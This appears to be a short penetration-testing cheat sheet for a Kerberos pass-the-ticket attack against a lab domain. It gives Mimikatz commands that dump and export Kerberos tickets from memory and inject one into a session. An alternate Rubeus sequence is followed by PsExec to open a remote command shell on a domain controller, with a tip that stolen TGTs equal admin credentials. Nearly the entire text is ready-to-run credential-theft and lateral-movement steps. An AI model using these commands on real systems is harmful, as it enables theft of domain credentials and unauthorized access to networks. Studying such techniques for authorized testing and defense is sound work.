### Tool: Mimikatz


#### 1) privilege::debug

#### 2) sekurlsa::tickets /export

#### 3) kerberos::ptt TICKET.kirbi

#### klist

### TIP: TGTs = Admin Credentials.

#### Access to any service the user is allowed to access.

### TGSs=Low-privileged account

## Alternate Method: Rubeus

 - .\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi

 - klist

 - .\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
